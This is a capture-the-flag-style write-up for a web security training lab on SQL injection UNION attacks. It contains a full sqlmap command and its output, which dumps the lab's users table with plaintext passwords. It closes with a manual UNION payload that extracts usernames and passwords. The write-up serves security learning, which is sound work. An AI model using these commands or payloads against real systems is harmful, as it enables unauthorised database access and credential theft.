## Lab: SQL injection UNION attack, retrieving multiple values in a single column

Description:

-  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

- The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user. 

```
┌──(kali㉿kali)-[~]
└─$ sudo sqlmap -u 'https://0a7c0032033ca2e480144417004d0045.web-security-academy.net/filter?category=*' --batch --random-agent --technique=U --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.8#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:35:01 /2026-08-31/

[03:35:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[03:35:01] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[03:35:01] [INFO] resuming back-end DBMS 'postgresql' 
[03:35:01] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('session=FsB6Lq3r8fa...b9ba2wjtJd'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: https://0a7c0032033ca2e480144417004d0045.web-security-academy.net/filter?category=' UNION ALL SELECT NULL,(CHR(113)||CHR(107)||CHR(98)||CHR(112)||CHR(113))||(CHR(121)||CHR(76)||CHR(120)||CHR(76)||CHR(83)||CHR(105)||CHR(78)||CHR(118)||CHR(105)||CHR(118)||CHR(112)||CHR(104)||CHR(75)||CHR(104)||CHR(68)||CHR(97)||CHR(84)||CHR(90)||CHR(107)||CHR(69)||CHR(83)||CHR(115)||CHR(73)||CHR(77)||CHR(84)||CHR(100)||CHR(84)||CHR(81)||CHR(110)||CHR(116)||CHR(83)||CHR(110)||CHR(108)||CHR(79)||CHR(102)||CHR(110)||CHR(102)||CHR(99)||CHR(67)||CHR(118))||(CHR(113)||CHR(113)||CHR(112)||CHR(120)||CHR(113))-- oTWW
---
[03:35:02] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[03:35:02] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:35:02] [INFO] fetching current database
[03:35:02] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
[03:35:02] [INFO] fetching tables for database: 'public'
[03:35:02] [INFO] fetching columns for table 'users' in database 'public'
[03:35:02] [INFO] fetching entries for table 'users' in database 'public'
Database: public
Table: users
[3 entries]
+-------+----------------------+---------------+
| email | password             | username      |
+-------+----------------------+---------------+
| NULL  | u0j9ulolzyx47kv658or | administrator |
| NULL  | qkd21gfp0url0je8kerw | wiener        |
| NULL  | tv93ibxk3hibfg3ia5h7 | carlos        |
+-------+----------------------+---------------+
```

Manual Payload:

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```